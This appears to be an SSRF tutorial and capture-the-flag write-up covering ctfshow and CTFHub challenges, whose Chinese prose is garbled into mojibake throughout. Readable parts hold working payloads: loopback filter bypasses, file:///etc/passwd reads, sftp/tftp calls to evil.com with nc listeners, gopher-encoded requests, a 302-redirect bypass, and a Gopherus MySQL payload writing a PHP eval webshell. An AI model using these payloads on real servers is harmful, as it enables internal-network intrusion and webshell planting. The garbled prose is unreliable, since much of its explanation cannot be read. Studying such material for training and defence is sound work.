ä½†æ˜¯åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œç¬¬ä¸€æ¬¡å»è¯·æ±‚DNSæœåŠ¡è¿›è¡ŒåŸŸåè§£æåˆ°ç¬¬äºŒæ¬¡æœåŠ¡ç«¯å»è¯·æ±‚URLä¹‹é—´å­˜åœ¨ä¸€ä¸ªæ—¶é—´å·®ï¼Œåˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œå¯ä»¥è¿›è¡ŒDNSé‡ç»‘å®šæ”»å‡»ã€‚ è¦å®ŒæˆDNSé‡ç»‘å®šæ”»å‡»ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªåŸŸåï¼Œå¹¶ä¸”å°†è¿™ä¸ªåŸŸåçš„è§£ææŒ‡å®šåˆ°æˆ‘ä»¬è‡ªå·±çš„DNS Serverï¼Œåœ¨æˆ‘ä»¬çš„å¯æ§çš„DNS Serverä¸Šç¼–å†™è§£ææœåŠ¡ï¼Œè®¾ç½®TTLæ—¶é—´ä¸º0ã€‚è¿™æ ·å°±å¯ä»¥è¿›è¡Œæ”»å‡»äº†ï¼Œå®Œæ•´çš„æ”»å‡»æµç¨‹ä¸ºï¼š æœåŠ¡å™¨ç«¯è·å¾—URLå‚æ•°ï¼Œè¿›è¡Œç¬¬ä¸€æ¬¡DNSè§£æï¼Œè·å¾—äº†ä¸€ä¸ªéå†…ç½‘çš„IP å¯¹äºè·å¾—çš„IPè¿›è¡Œåˆ¤æ–­ï¼Œå‘ç°ä¸ºéé»‘åå•IPï¼Œåˆ™é€šè¿‡éªŒè¯ æœåŠ¡å™¨ç«¯å¯¹äºURLè¿›è¡Œè®¿é—®ï¼Œç”±äºDNSæœåŠ¡å™¨è®¾ç½®çš„TTLä¸º0ï¼Œæ‰€ä»¥å†æ¬¡è¿›è¡ŒDNSè§£æï¼Œè¿™ä¸€æ¬¡DNSæœåŠ¡å™¨è¿”å›çš„æ˜¯å†…ç½‘åœ°å€ã€‚ ç”±äºå·²ç»ç»•è¿‡éªŒè¯ï¼Œæ‰€ä»¥æœåŠ¡å™¨ç«¯è¿”å›è®¿é—®å†…ç½‘èµ„æºçš„ç»“æœã€‚ åˆ©ç”¨IPv6æœ‰äº›æœåŠ¡æ²¡æœ‰è€ƒè™‘IPv6çš„æƒ…å†µï¼Œä½†æ˜¯å†…ç½‘åˆæ”¯æŒIPv6ï¼Œåˆ™å¯ä»¥ä½¿ç”¨IPv6çš„æœ¬åœ°IPå¦‚ [::] 0000::1 æˆ–IPv6çš„å†…ç½‘åŸŸåæ¥ç»•è¿‡è¿‡æ»¤ï¼Œä¸IPv4çš„å›ç¯åœ°å€ 127.0.0.1 ç±»ä¼¼ curl http://[::1]/ æ¼æ´åˆ©ç”¨äº§ç”Ÿæ¼æ´çš„å‡½æ•°ï¼šæ ¹æ®åå°ä½¿ç”¨çš„å‡½æ•°çš„ä¸åŒï¼Œç›¸åº”çš„å½±å“å’Œåˆ©ç”¨æ–¹æ³•ä¹Ÿä¸ä¸€æ ·ï¼ŒPHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF: file_get_contents()fsockopen()curl_exec() file_get_contents() è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œå¹¶ä¸”æ­¤å‡½æ•°æ˜¯ç”¨äºæŠŠæ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚ æ¯”å¦‚ï¼šä¸‹é¢çš„ä»£ç ä½¿ç”¨file_get_contentså‡½æ•°ä»ç”¨æˆ·æŒ‡å®šçš„urlè·å–å›¾ç‰‡ã€‚ç„¶åæŠŠå®ƒç”¨ä¸€ä¸ªéšå³æ–‡ä»¶åä¿å­˜åœ¨ç¡¬ç›˜ä¸Šï¼Œå¹¶å±•ç¤ºç»™ç”¨æˆ·ã€‚ ?phpif (isset($_POST[url])) $content = file_get_contents($_POST[url]); $filename =./images/.rand().;img1.jpg; file_put_contents($filename, $content); echo $_POST[url]; $img = img src=\\.$filename.\\/; echo $img; ? sockopen() ä½¿ç”¨fsockopenå‡½æ•°å®ç°è·å–ç”¨æˆ·åˆ¶å®šurlçš„æ•°æ®ï¼ˆæ–‡ä»¶æˆ–è€…html) ä»¥ä¸‹ä»£ç ä½¿ç”¨fsockopenå‡½æ•°å®ç°è·å–ç”¨æˆ·åˆ¶å®šurlçš„æ•°æ®ï¼ˆæ–‡ä»¶æˆ–è€…htmlï¼‰ã€‚è¿™ä¸ªå‡½æ•°ä¼šä½¿ç”¨socketè·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œä¼ è¾“åŸå§‹æ•°æ®ã€‚ ?php function GetFile($host,$port,$link) $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) echo $errstr (error number $errno) ; else $out = GET $link HTTP/1.1\\r ; $out .= Host: $host\\r ; $out .= Connection: Close\\r \\r ; $out .= \\r ; fwrite($fp, $out); $contents=; while (!feof($fp)) $contents.= fgets($fp, 1024); fclose($fp); return $contents; ? curl_exec() è¯¥å‡½æ•°å¯ä»¥æ‰§è¡Œç»™å®šçš„curlä¼šè¯ cURLè¿™æ˜¯å¦ä¸€ä¸ªéå¸¸å¸¸è§çš„å®ç°ï¼Œå®ƒé€šè¿‡ PHPè·å–æ•°æ®ã€‚æ–‡ä»¶æ•°æ®è¢«ä¸‹è½½å¹¶å­˜å‚¨åœ¨â€œcurledâ€æ–‡ä»¶å¤¹ä¸‹çš„ç£ç›˜ä¸­ï¼Œå¹¶é™„åŠ äº†ä¸€ä¸ªéšæœºæ•°å’Œâ€œ.txtâ€æ–‡ä»¶æ‰©å±•åã€‚ ?php if (isset($_POST[url]))$link = $_POST[url];$curlobj = curl_init();curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($curlobj);curl_close($curlobj);$filename = ./curled/.rand()..txt;file_put_contents($filename, $result); echo $result;? æ³¨æ„äº‹é¡¹ æ³¨æ„äº‹é¡¹ ä¸€èˆ¬æƒ…å†µä¸‹PHPä¸ä¼šå¼€å¯fopençš„gopher wrapperfile_get_contentsçš„gopheråè®®ä¸èƒ½URLç¼–ç file_get_contentså…³äºGopherçš„302è·³è½¬ä¼šå‡ºç°bugï¼Œå¯¼è‡´åˆ©ç”¨å¤±è´¥curl/libcurl 7.43 ä¸Šgopheråè®®å­˜åœ¨bug(%00æˆªæ–­) ç»æµ‹è¯•7.49 å¯ç”¨curl_exec() é»˜è®¤ä¸è·Ÿè¸ªè·³è½¬ï¼Œfile_get_contents() file_get_contentsæ”¯æŒphp://inputåè®® urlä¼ªåè®®ctfhubä¼ªåè®®è¯»å–æ–‡ä»¶(file:)è¿™ç§URL Schemaå¯ä»¥å°è¯•ä»æ–‡ä»¶ç³»ç»Ÿä¸­è·å–æ–‡ä»¶ï¼š http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini å¦‚æœè¯¥æœåŠ¡å™¨é˜»æ­¢å¯¹å¤–éƒ¨ç«™ç‚¹å‘é€HTTPè¯·æ±‚ï¼Œæˆ–å¯ç”¨äº†ç™½åå•é˜²æŠ¤æœºåˆ¶ï¼Œåªéœ€ä½¿ç”¨å¦‚ä¸‹æ‰€ç¤ºçš„URL Schemaå°±å¯ä»¥ç»•è¿‡è¿™äº›é™åˆ¶ï¼š ctfhub-ç«¯å£æ‰«æ(dict:)dict åè®®æ˜¯ä¸€ä¸ªå­—å…¸æœåŠ¡å™¨åè®®ï¼Œé€šå¸¸ç”¨äºè®©å®¢æˆ·ç«¯ä½¿ç”¨è¿‡ç¨‹ä¸­èƒ½å¤Ÿè®¿é—®æ›´å¤šçš„å­—å…¸æºï¼Œèƒ½ç”¨æ¥æ¢æµ‹ç«¯å£çš„æŒ‡çº¹ä¿¡æ¯åè®®æ ¼å¼ï¼šdict://host:port/dict-pathä¸€èˆ¬ç”¨dict://host:port/info æ¢æµ‹ç«¯å£åº”ç”¨ä¿¡æ¯ ä¸¾ä¸ªæ —å­: dict://127.0.0.1:6379 //æ¢æµ‹redisæ˜¯å¦å­˜æ´»dict://127.0.0.1:6379/info //æ¢æµ‹ç«¯å£åº”ç”¨ä¿¡æ¯ åˆ©ç”¨bpä¸­çš„çˆ†ç ´æ¨¡å—è¿›è¡Œç«¯å£çˆ†ç ´ å¾—åˆ°é•¿åº¦æ˜æ˜¾ä¸å…¶ä»–ä¸ä¸€æ ·çš„ç«¯å£å·ï¼Œè®¿é—®ï¼Œå¾—åˆ°flag sftp:åœ¨è¿™é‡Œï¼ŒSftpä»£è¡¨SSHæ–‡ä»¶ä¼ è¾“åè®®ï¼ˆSSH File Transfer Protocolï¼‰ï¼Œæˆ–å®‰å…¨æ–‡ä»¶ä¼ è¾“åè®®ï¼ˆSecure File Transfer Protocolï¼‰ï¼Œè¿™æ˜¯ä¸€ç§ä¸SSHæ‰“åŒ…åœ¨ä¸€èµ·çš„å•ç‹¬åè®®ï¼Œå®ƒè¿è¡Œåœ¨å®‰å…¨è¿æ¥ä¸Šï¼Œå¹¶ä»¥ç±»ä¼¼çš„æ–¹å¼è¿›è¡Œå·¥ä½œã€‚ Copyhttp://example.com/ssrf.php?url=sftp://evil.com:1337/ evil.com:$ nc -lvp 1337Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2 ldap:æˆ–ldaps: æˆ–ldapi:LDAPä»£è¡¨è½»é‡çº§ç›®å½•è®¿é—®åè®®ã€‚å®ƒæ˜¯IPç½‘ç»œä¸Šçš„ä¸€ç§ç”¨äºç®¡ç†å’Œè®¿é—®åˆ†å¸ƒå¼ç›®å½•ä¿¡æ¯æœåŠ¡çš„åº”ç”¨ç¨‹åºåè®®ã€‚ Copyhttp://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit tftp:TFTPï¼ˆTrivial File Transfer Protocol,ç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼‰æ˜¯ä¸€ç§ç®€å•çš„åŸºäºlockstepæœºåˆ¶çš„æ–‡ä»¶ä¼ è¾“åè®®ï¼Œå®ƒå…è®¸å®¢æˆ·ç«¯ä»è¿œç¨‹ä¸»æœºè·å–æ–‡ä»¶æˆ–å°†æ–‡ä»¶ä¸Šä¼ è‡³è¿œç¨‹ä¸»æœºã€‚ Copyhttp://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET evil.com:# nc -lvup 1337Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3 Gopheråè®®åˆæ­¥ä½¿ç”¨Gopheræ˜¯Internetä¸Šä¸€ä¸ªéå¸¸æœ‰åçš„ä¿¡æ¯æŸ¥æ‰¾ç³»ç»Ÿï¼Œå®ƒå°†Internetä¸Šçš„æ–‡ä»¶ç»„ç»‡æˆæŸç§ç´¢å¼•ï¼Œå¾ˆæ–¹ä¾¿åœ°å°†ç”¨æˆ·ä»Internetçš„ä¸€å¤„å¸¦åˆ°å¦ä¸€å¤„ã€‚åœ¨WWWå‡ºç°ä¹‹å‰ï¼ŒGopheræ˜¯Internetä¸Šæœ€ä¸»è¦çš„ä¿¡æ¯æ£€ç´¢å·¥å…·ï¼ŒGopherç«™ç‚¹ä¹Ÿæ˜¯æœ€ä¸»è¦çš„ç«™ç‚¹ï¼Œä½¿ç”¨tcp70ç«¯å£ã€‚ä½†åœ¨WWWå‡ºç°åï¼ŒGopherå¤±å»äº†æ˜”æ—¥çš„è¾‰ç…Œã€‚ç°åœ¨å®ƒåŸºæœ¬è¿‡æ—¶ï¼Œäººä»¬å¾ˆå°‘å†ä½¿ç”¨å®ƒï¼› gopheråè®®æ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œåœ¨æ„æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­æœ€å¼ºå¤§çš„åè®® å¯¹äºä½¿ç”¨Gopheråè®®çš„æ¡ä»¶ï¼š Gopheråè®®æ ¼å¼ï¼š URL:gopher://host:port/gopher-path_åæ¥TCPæ•°æ®æµ gopherçš„é»˜è®¤ç«¯å£æ˜¯70 å¦‚æœå‘èµ·postè¯·æ±‚ï¼Œå›è½¦æ¢è¡Œéœ€è¦ä½¿ç”¨%0d%0aï¼Œå¦‚æœå¤šä¸ªå‚æ•°ï¼Œå‚æ•°ä¹‹é—´çš„ä¹Ÿéœ€è¦è¿›è¡ŒURLç¼–ç  Gopherå‘é€è¯·æ±‚HTTP GETè¯·æ±‚ï¼š ï¼ˆå¯ä»¥åœ¨xshellé‡Œé¢å¼€ä¸¤ä¸ªä¼šè¯ï¼‰ ä½¿ç”¨Gopheråè®®å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œç¯å¢ƒä¸ºï¼šncèµ·ä¸€ä¸ªç›‘å¬ï¼Œcurlå‘é€gopherè¯·æ±‚ ncå¯åŠ¨ç›‘å¬ï¼Œç›‘å¬2333ç«¯å£ï¼šnc -lp 2333 ä½¿ç”¨curlå‘é€httpè¯·æ±‚ï¼Œå‘½ä»¤ä¸º curl gopher://192.168.0.119:2333/abcd æ­¤æ—¶ncæ”¶åˆ°çš„æ¶ˆæ¯ä¸ºï¼šbcd å¦‚æœæƒ³è¦æ¥æ”¶åˆ°æ‰€æœ‰çš„æ¶ˆæ¯ï¼Œéœ€è¦åœ¨ä½¿ç”¨gopheråè®®æ—¶åœ¨urlååŠ å…¥ä¸€ä¸ªå­—ç¬¦ï¼ˆè¯¥å­—ç¬¦å¯éšæ„å†™ï¼‰ Gopherå‘é€è¯·æ±‚HTTP GETè¯·æ±‚ï¼š éœ€è¦ä»¥ä¸‹ä¸‰æ­¥ï¼š 1ã€æ„é€ HTTPæ•°æ®åŒ…2ã€URLç¼–ç ã€æ›¿æ¢å›è½¦æ¢è¡Œä¸º%0d%0a3ã€å‘é€gopheråè®® æˆ‘å‡†å¤‡äº†ä¸€ä¸ªPHPçš„ä»£ç ï¼Œå¦‚ä¸‹ï¼š ?php echo Hello .$_GET[name]. ? ä¸€ä¸ªGETå‹çš„HTTPåŒ…ï¼Œå¦‚ä¸‹ï¼š GET /ssrf/base/get.php?name=Margin HTTP/1.1Host: 1.0.0.1 URLç¼–ç åä¸ºï¼š curl gopher://1.0.0.1:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%201.0.0.1%0d%0A åœ¨è½¬æ¢ä¸ºURLç¼–ç æ—¶å€™æœ‰è¿™ä¹ˆå‡ ä¸ªå‘ 1ã€é—®å·ï¼ˆï¼Ÿï¼‰éœ€è¦è½¬ç ä¸ºURLç¼–ç ï¼Œä¹Ÿå°±æ˜¯%3f2ã€å›è½¦æ¢è¡Œè¦å˜ä¸º%0d%0a,ä½†å¦‚æœç›´æ¥ç”¨å·¥å…·è½¬ï¼Œå¯èƒ½åªä¼šæœ‰%0a3ã€åœ¨HTTPåŒ…çš„æœ€åè¦åŠ %0d%0aï¼Œä»£è¡¨æ¶ˆæ¯ç»“æŸï¼ˆå…·ä½“å¯ç ”ç©¶HTTPåŒ…ç»“æŸï¼‰ Gopherå‘é€è¯·æ±‚HTTP POSTè¯·æ±‚ï¼š ä»¥ä¸‹å››ä¸ªå‚æ•°ä¸ºpostä¼ å‚æ—¶æ‰€å¿…é¡»çš„å‚æ•°ï¼š POST /ssrf/base/post.php HTTP/1.1host:192.168.0.109Content-Type:application/x-www-form-urlencodedContent-Length:11name=Margin post.phpçš„ä»£ç ä¸º ?php echo Hello .$_POST[name]. ? ä½¿ç”¨curlå‘èµ·gopherçš„POSTè¯·æ±‚å¹¶è¿›è¡Œurlç¼–ç ï¼š curl gopher://0.0.0.1:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:0.0.0.1%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A å‘é€æˆåŠŸ ä½¿ç”¨Gopheråè®®urlç¼–ç æ¬¡æ•°ä¼ å‚ç»è¿‡å¤šå°‘æ¬¡è·³è½¬å°±éœ€è¦ç»è¿‡å¤šå°‘æ¬¡urlç¼–ç ã€‚ ç›´æ¥curlåæ¥gopher:å°±ç¼–ç ä¸€æ¬¡ã€‚ åˆ©ç”¨?urlgopher:å°±ç¼–ç ä¸¤æ¬¡ã€‚ è¿˜ç»è¿‡302è·³è½¬ï¼Œå°±ç¼–ç ä¸‰æ¬¡ã€‚ ctfshowå®æˆ˜web-351?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[url];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);? å¯¹ä¸Šè¿°ä»£ç çš„è§£æå¦‚ä¸‹ï¼š ç¦æ­¢æ˜¾ç¤º PHP é”™è¯¯æŠ¥å‘Šï¼Œä½¿ç”¨ error_reporting(0)ï¼› ä½¿ç”¨ highlight_file(__FILE__) æ˜¾ç¤ºå½“å‰ PHP æ–‡ä»¶çš„æºä»£ç ï¼› è·å–é€šè¿‡ POST è¯·æ±‚ä¼ é€’çš„ URLï¼Œå­˜å‚¨åœ¨ $url å˜é‡ä¸­ï¼› ä½¿ç”¨ curl_init() åˆå§‹åŒ–ä¸€ä¸ª cURL ä¼šè¯ï¼› ä½¿ç”¨ curl_setopt() å‡½æ•°è®¾ç½® cURL é€‰é¡¹ï¼ŒåŒ…æ‹¬å…³é—­ HTTP å¤´ä¿¡æ¯çš„è¾“å‡ºï¼ˆCURLOPT_HEADERï¼‰ä»¥åŠå°†è¿”å›çš„æ•°æ®ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›ï¼ˆCURLOPT_RETURNTRANSFERï¼‰ï¼› ä½¿ç”¨ curl_exec() å‡½æ•°æ‰§è¡Œ cURL ä¼šè¯ï¼Œè·å– URL å¯¹åº”é¡µé¢çš„å†…å®¹ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ $result å˜é‡ä¸­ï¼› ä½¿ç”¨ curl_close() å‡½æ•°å…³é—­ cURL ä¼šè¯ï¼› æœ€åï¼Œä½¿ç”¨ echo è¾“å‡ºè·å–åˆ°çš„é¡µé¢å†…å®¹ å°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è®¿é—®å†…ç½‘ï¼šurl=127.0.0.1ï¼Œé¡µé¢åˆå›æ˜¾äº†ä¸€éä¸Šè¿°ä»£ç ï¼Œè¯´æ˜å¯ä»¥ ç›²çŒœä¸€æ³¢flag.phpåœ¨å½“å‰ç›®å½•ä¸‹ï¼šurl=127.0.0.1/flag.phpå›æ˜¾å‡ºflagï¼Œä¹Ÿå¯ä»¥url=localhost/flag.php web-352353?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[url];$x=parse_url($url);if($x[scheme]===http||$x[scheme]===https)if(!preg_match(/localhost|127.0.0/))$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);else die(hacker);else die(hacker); ? å¯ä»¥å¯¹127.0.0.1è¿›è¡Œç¼–ç ç»•è¿‡ï¼Œå…·ä½“è¿›ä¸Šé¢æ–‡ç« ä¸­çš„ç»•è¿‡æ–¹æ³•ï¼ˆå¥å·çš„æ–¹æ³•è¡Œä¸é€šï¼‰ url=http://2130706433/flag.phpï¼šå¾—åˆ°flag åœ¨Linuxç¯å¢ƒä¸­ï¼Œ0ä»£è¡¨è‡ªèº«åœ°å€ï¼Œä¹Ÿå¯ä»¥url=http://0/flag.php web-354ï¼ˆsudo.ccï¼‰?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[url];$x=parse_url($url);if($x[scheme]===http||$x[scheme]===https)if(!preg_match(/localhost|1|0|ã€‚/i, $url))$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);else die(hacker);else die(hacker);? sudo.ccç›¸å½“äº127.0.0.1 url=http://sudo.cc/flag.phpï¼šå¾—åˆ°flag web-355356?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[url];$x=parse_url($url);if($x[scheme]===http||$x[scheme]===https)$host=$x[host];if((strlen($host)=5))$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);else die(hacker);else die(hacker);? strlen($host)=5ï¼šè¦æ±‚è¾“å…¥çš„ä¸»æœºåé•¿åº¦å°äºç­‰äº5 è¿™é‡Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨0æ¥ç»•è¿‡ï¼šurl=http://0/flag.php web-356ï¼šä¸»æœºåé•¿åº¦è¦æ±‚å°äºç­‰äº3 web-357?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[url];$x=parse_url($url);if($x[scheme]===http||$x[scheme]===https)$ip = gethostbyname($x[host]);echo /br.$ip./br;if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) die(ip!);echo file_get_contents($_POST[url]);else die(scheme);? if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) die(ip!); ï¼šéªŒè¯IPåœ°å€æ˜¯å¦æœ‰æ•ˆï¼Œå¹¶ä¸”ä¸æ˜¯ç§æœ‰IPåœ°å€æˆ–ä¿ç•™IPåœ°å€ï¼ŒéªŒè¯å¤±è´¥çš„è¯å°±ä¼šè¾“å‡ºipå¹¶åœæ­¢è¿è¡Œ è¿™è¯´æ˜äº†åœ°å€ä¸èƒ½æ˜¯127.0.0.1ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨302è·³è½¬çš„æ–¹å¼æ¥è¿›å…¥å†…ç½‘ åœ¨æœåŠ¡å™¨ä¸Šé¢å¼€ä¸€ä¸ªç«¯å£ï¼Œå¹¶ä¸”å…¶phpæ–‡ä»¶å¦‚ä¸‹ï¼š ?php header(Location:http://127.0.0.1/flag.php); ç„¶ååœ¨getä¼ å‚ä¸ºï¼š?url=http://555.555.555.555:555ï¼Œå¾—åˆ°flagï¼Œé¢˜ç›®è§£å†³ web-358?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[url];$x=parse_url($url);if(preg_match(/^http:\\/\\/ctf\\..*show$/i,$url)) echo file_get_contents($url); parse_urlè§£æé—®é¢˜ï¼Œå‚è€ƒæ–‡ç« ï¼šparse_urlå°ç»“ æ ¹æ®å‚è€ƒæ–‡ç« å’Œæœ¬ç‰‡æ–‡ç« å‰é¢æåˆ°è¿‡çš„ç»•è¿‡æ–¹æ³•ï¼Œæœ€åçš„payloadä¸ºï¼šhttp://ctf.@127.0.0.1/flag.php#show å…¶å®å°†#æ”¹ä¸ºï¼Ÿä¹Ÿæ˜¯å¯ä»¥çš„ web-359è¿™é¢˜æ˜¯è¦æ‰“æ— å¯†ç ä¿æŠ¤çš„mysql é¦–å…ˆæˆ‘ä»¬å¼€å¯proxyï¼Œç™»å½•ä¸€ä¸‹ï¼Œåœ¨bpçš„ä»£ç†æ¨¡å—çš„HTTPå†å²è®°å½•ä¸­æ‰¾åˆ°/check.phpï¼Œå†…å®¹å¦‚ä¸‹ï¼š å¯ä»¥å‘ç°Postä¼ å‚ä¸­æœ‰returlï¼Œå‚æ•°æ˜¯ç½‘å€ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨gopheråè®®æ¥æ“ä½œ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨å·¥å…·gopherusï¼ˆåœ¨ä¸‹æ–‡çš„CTFHubä¸­æˆ‘æœ‰æä¾›ä¸‹è½½çš„é“¾æ¥ï¼‰ æˆ‘ä»¬è¾“å…¥å‘½ä»¤ï¼špython2 gopherus.py --exploit mysqlï¼Œå‰©ä¸‹çš„å¦‚ä¸‹ï¼šselect ?php @eval($_POST[cmd]);? into outfile /var/www/html/aa.php;ï¼šè¿™æ¡å‘½ä»¤æ˜¯ä½¿ç”¨æ•°æ®åº“çš„åŠŸèƒ½åˆ›å»ºä¸€ä¸ªphpæ–‡ä»¶ï¼Œæ–‡ä»¶ä½ç½®åœ¨/var/www/html/aa.php å¾—åˆ°çš„payloadå†æ‹¿å»ç¼–ç ä¸€æ¬¡åæ‹¿å»ä½¿ç”¨ï¼Œç„¶åå†ç”¨èšå‰‘åŒ…å«è¯¥æ–‡ä»¶ä¾¿å¯ä»¥äº† å¾—åˆ°flagï¼Œé¢˜ç›®è§£å†³ web-360è¿™é¢˜é¢˜ç›®å«æ‰“redis ?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[url];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);? äºæ˜¯æˆ‘ä»¬è·Ÿä¸Šé¢˜ä¸€æ ·ï¼Œç”¨gopheruså·¥å…·æ¥æ‰“ æ­¥éª¤è·Ÿä¸‹é¢ctfhubé‡Œé¢çš„Redisåè®®çš„æ“ä½œæ­¥éª¤ä¸€æ¨¡ä¸€æ ·ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº† CTFHubPOSTè¯·æ±‚åœ¨é¢˜ç›®ç¯å¢ƒä¸­è®¿é—®ï¼š?url=127.0.0.1/flag.phpï¼Œçœ‹åˆ°é¡µé¢å¼¹å‡ºä¸€ä¸ªè¾“å…¥æ¡†ï¼ŒæŸ¥çœ‹æºç å¦‚ä¸‹ï¼š form action=/flag.php method=postinput type=text name=key!-- Debug: key=7cc8e7f97ec84ca8f88fed4a62df26d1--/form å°†è¯¥å€¼å¡«å…¥è¾“å…¥æ¡†ï¼Œå¾—åˆ°å›æ˜¾ä¸ºï¼šJust View From 127.0.0.1 ç„¶åè®¿é—®ï¼š?url=file:///var/www/html/index.phpï¼Œå¾—åˆ°å¦‚ä¸‹ä»£ç ï¼š ?php// å…³é—­æ‰€æœ‰é”™è¯¯æŠ¥å‘Šerror_reporting(0);// æ£€æŸ¥è¯·æ±‚ä¸­æ˜¯å¦åŒ…å« url å‚æ•°if (!isset($_REQUEST[url])) // å¦‚æœæ²¡æœ‰ url å‚æ•°ï¼Œé‡å®šå‘åˆ°è‡ªèº«å¹¶é™„åŠ ä¸€ä¸ªé»˜è®¤çš„ url å‚æ•° header(Location: /?url=_); exit; // ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ// åˆå§‹åŒ–ä¸€ä¸ªcURLä¼šè¯$ch = curl_init();// è®¾ç½®cURLé€‰é¡¹curl_setopt($ch, CURLOPT_URL, $_REQUEST[url]); // è®¾ç½®è¦è¯·æ±‚çš„URLä¸ºç”¨æˆ·æä¾›çš„ url å‚æ•°å€¼curl_setopt($ch, CURLOPT_HEADER, 0); // ä¸åŒ…å«å¤´éƒ¨ä¿¡æ¯åœ¨è¾“å‡ºä¸­curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); // å…è®¸cURLå¤„ç†é‡å®šå‘// æ‰§è¡ŒcURLä¼šè¯curl_exec($ch);// å…³é—­cURLä¼šè¯å¹¶é‡Šæ”¾èµ„æºcurl_close($ch); è®¿é—®ï¼š?url=file:///var/www/html/flag.phpï¼Œä»£ç å¦‚ä¸‹ï¼š ?php// å…³é—­æ‰€æœ‰é”™è¯¯æŠ¥å‘Šerror_reporting(0);// æ£€æŸ¥è®¿é—®è€…çš„IPåœ°å€æ˜¯å¦ä¸º127.0.0.1if ($_SERVER[REMOTE_ADDR] != 127.0.0.1) echo Just View From 127.0.0.1; return;// è·å–ç¯å¢ƒå˜é‡ CTFHUB çš„å€¼$flag = getenv(CTFHUB);// ç”Ÿæˆflagçš„MD5å“ˆå¸Œå€¼$key = md5($flag);// æ£€æŸ¥POSTè¯·æ±‚ä¸­æ˜¯å¦åŒ…å«æ­£ç¡®çš„keyif (isset($_POST[key]) $_POST[key] == $key) // å¦‚æœPOSTè¯·æ±‚ä¸­çš„keyæ­£ç¡®ï¼Œè¾“å‡ºflag echo $flag; exit;?!-- HTMLè¡¨å•ï¼Œæäº¤åˆ°å½“å‰è„šæœ¬ --form action=/flag.php method=postinput type=text name=key!-- Debug: key=?php echo $key;?--/form ç”±äº $_SERVER[REMOTE_ADDR] != 127.0.0.1è¿™ä¸ªæ— æ³•ç»•è¿‡ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨flag.phpï¼Œæ‰€ä»¥åªèƒ½å°è¯•é€šè¿‡index.phpå‘ç›®æ ‡å‘é€postè¯·æ±‚ å°è¯•ä½¿ç”¨ Gopher åè®®å‘æœåŠ¡å™¨å‘é€ POST åŒ…é¦–å…ˆæ„é€  Gopheråè®®æ‰€éœ€çš„ 